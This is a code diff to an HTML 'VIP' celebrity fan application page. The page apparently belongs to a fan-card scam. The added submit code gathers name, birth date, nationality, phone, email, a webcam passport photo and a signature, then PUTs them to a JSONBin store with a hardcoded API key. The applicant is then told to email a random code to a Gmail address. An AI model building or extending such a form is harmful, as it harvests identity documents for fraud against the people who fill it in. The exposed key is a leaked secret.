@@ -960,6 +960,10 @@
     box-shadow: 0 4px 20px rgba(0, 77, 77, 0.2);
     text-shadow: 0 1px 2px rgba(0,0,0,0.2);
   }
+  .submit-btn:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+  }
   .submit-btn::before {
     content:''; position: absolute;
     top:-50%; left:-65%; width:50%; height:200%;
@@ -1101,6 +1105,33 @@
     transform: translateY(-2px);
     box-shadow: 0 6px 20px rgba(0, 128, 128, 0.3);
   }
+
+  /* ── ERROR OVERLAY (submission failure) ── */
+  .error-banner {
+    display: none;
+    background: rgba(200,74,74,0.1);
+    border: 1px solid rgba(200,74,74,0.35);
+    color: #a83838;
+    border-radius: 4px;
+    padding: 12px 18px;
+    font-family: 'Raleway', sans-serif;
+    font-size: 0.82rem;
+    text-align: center;
+    margin-top: 16px;
+  }
+
+  /* ── SUBMIT SPINNER ── */
+  .spinner {
+    display: inline-block;
+    width: 14px; height: 14px;
+    border: 2px solid rgba(255,255,255,0.4);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
@@ -1412,10 +1443,11 @@
       </div>
 
       <div class="btn-wrap">
-        <button type="button" class="submit-btn" onclick="handleSubmit()">
+        <button type="button" class="submit-btn" id="submitBtn" onclick="handleSubmit()">
           ✦SUBMIT✦
         </button>
         <div class="fine-print">Your information is handled with absolute confidentiality</div>
+        <div class="error-banner" id="errorBanner"></div>
       </div>
 
     </form>
@@ -1426,6 +1458,15 @@
 </div>
 
 <script>
+/* ─────────────────────────────────────
+   JSONBIN CONFIGURATION
+   Shared database between this frontend
+   and the WSCH Admin Dashboard.
+───────────────────────────────────── */
+const JSONBIN_BIN_ID  = '6a2b8607da38895dfeb27f21';
+const JSONBIN_API_KEY = '$2a$10$Up7hiB8jaJdNL0mEVQyC1uHG9hpBLH3S.czl/x7lwc0Qehty3QtOi';
+const JSONBIN_URL     = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;
+
 /* ── DATES ── */
 function setDates() {
   const now = new Date();
@@ -1491,15 +1532,16 @@ function captureSnapshot() {
   const controls = document.getElementById('passportControls');
   
   const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth || 480;
-  canvas.height = video.videoHeight || 600;
+  // Compress passport image to keep JSONBin payload small
+  canvas.width = 240;
+  canvas.height = 300;
   const ctx2d = canvas.getContext('2d');
   
   ctx2d.translate(canvas.width, 0);
   ctx2d.scale(-1, 1);
   ctx2d.drawImage(video, 0, 0, canvas.width, canvas.height);
   
-  output.src = canvas.toDataURL('image/jpeg');
+  output.src = canvas.toDataURL('image/jpeg', 0.7);
   output.style.display = 'block';
   
   terminateCameraStream();
@@ -1675,18 +1717,18 @@ function setThickness(el) {
 }
 
 /* ── SUBMISSION PROCESSING ── */
-const issuedCodes = new Set();
-
 function generateUniqueVIPCode() {
-  let code;
-  do {
-    code = Math.floor(10000 + Math.random() * 90000);
-  } while (issuedCodes.has(code));
-  issuedCodes.add(code);
-  return code;
+  return Math.floor(10000 + Math.random() * 90000);
 }
 
-function handleSubmit() {
+function showError(msg) {
+  const banner = document.getElementById('errorBanner');
+  banner.textContent = msg;
+  banner.style.display = 'block';
+  setTimeout(() => { banner.style.display = 'none'; }, 6000);
+}
+
+async function handleSubmit() {
   const name        = document.getElementById('fullName').value.trim();
   const gender      = document.getElementById('gender').value;
   const dob         = document.getElementById('dob').value;
@@ -1728,34 +1770,92 @@ function handleSubmit() {
   }
 
   const vipCode = generateUniqueVIPCode();
+  const submitBtn = document.getElementById('submitBtn');
 
-  document.getElementById('successMsg').innerHTML = 
-    `Your VIP code is <div class="vip-code-highlight">${vipCode}</div><br>
-     Kindly send it to the email below for validation process.<br><br>
-     <strong>Email:</strong> <a class="clickable-email" href="mailto:worldstarscelebrity@gmail.com?subject=VIP%20Validation%20Code%20-%20${vipCode}&body=Hello,%20here%20is%20my%20VIP%20validation%20code:%20${vipCode}">worldstarscelebrity@gmail.com</a>`;
+  // Compress signature too
+  const sigDataUrl = sigCanvas.toDataURL('image/png');
 
-  const overlay = document.getElementById('successOverlay');
-  overlay.style.display = 'flex';
-  
-  void overlay.offsetWidth; 
-  
-  overlay.classList.add('show');
-  spawnConfetti();
-  
-  document.getElementById('vipForm').reset();
-  clearSignature();
-  
-  imageCaptured = false;
-  document.getElementById('passportOutput').style.display = 'none';
-  document.getElementById('passportOutput').src = '';
-  document.getElementById('passportFrame').classList.remove('active-capture');
-  document.getElementById('passportControls').style.display = 'none';
-  document.getElementById('passportControls').querySelector('.snap').style.display = 'block';
-  document.getElementById('passportStaticUi').style.display = 'block';
-  terminateCameraStream();
+  const payload = {
+    id:          vipCode,
+    fullName:    name,
+    gender:      gender,
+    dob:         dob,
+    nationality: nationality,
+    phone:       phone,
+    email:       email,
+    celebrity:   celebrity,
+    devotion:    devotion,
+    tier:        document.getElementById('selectedTierInput').value,
+    appDate:     document.getElementById('appDate').value,
+    passportImg: document.getElementById('passportOutput').src || null,
+    signature:   sigDataUrl,
+    status:      'pending',
+    receivedAt:  Date.now(),
+  };
 
-  setDates();
-  confirmTierSelection(1);
+  submitBtn.disabled = true;
+  submitBtn.innerHTML = '<span class="spinner"></span>SUBMITTING...';
+
+  try {
+    // 1. Fetch the current applications array from JSONBin
+    const getRes = await fetch(`${JSONBIN_URL}/latest`, {
+      headers: { 'X-Access-Key': JSONBIN_API_KEY }
+    });
+    if (!getRes.ok) throw new Error('Failed to reach server');
+    const getData = await getRes.json();
+
+    let records = Array.isArray(getData.record) ? getData.record : [];
+    // Drop the throwaway init record if present
+    records = records.filter(r => r && r.id !== 0);
+
+    // 2. Add new application to the front
+    records.unshift(payload);
+
+    // 3. Push updated array back to JSONBin
+    const putRes = await fetch(JSONBIN_URL, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Access-Key': JSONBIN_API_KEY
+      },
+      body: JSON.stringify(records)
+    });
+    if (!putRes.ok) throw new Error('Failed to submit application');
+
+    // ── SUCCESS ──
+    document.getElementById('successMsg').innerHTML = 
+      `Your VIP code is <div class="vip-code-highlight">${vipCode}</div><br>
+       Kindly send it to the email below for validation process.<br><br>
+       <strong>Email:</strong> <a class="clickable-email" href="mailto:worldstarscelebrity@gmail.com?subject=VIP%20Validation%20Code%20-%20${vipCode}&body=Hello,%20here%20is%20my%20VIP%20validation%20code:%20${vipCode}">worldstarscelebrity@gmail.com</a>`;
+
+    const overlay = document.getElementById('successOverlay');
+    overlay.style.display = 'flex';
+    void overlay.offsetWidth;
+    overlay.classList.add('show');
+    spawnConfetti();
+
+    document.getElementById('vipForm').reset();
+    clearSignature();
+
+    imageCaptured = false;
+    document.getElementById('passportOutput').style.display = 'none';
+    document.getElementById('passportOutput').src = '';
+    document.getElementById('passportFrame').classList.remove('active-capture');
+    document.getElementById('passportControls').style.display = 'none';
+    document.getElementById('passportControls').querySelector('.snap').style.display = 'block';
+    document.getElementById('passportStaticUi').style.display = 'block';
+    terminateCameraStream();
+
+    setDates();
+    confirmTierSelection(1);
+
+  } catch (err) {
+    console.error(err);
+    showError('Submission failed — please check your internet connection and try again.');
+  } finally {
+    submitBtn.disabled = false;
+    submitBtn.innerHTML = '✦SUBMIT✦';
+  }
 }
 
 function closeSuccess() {
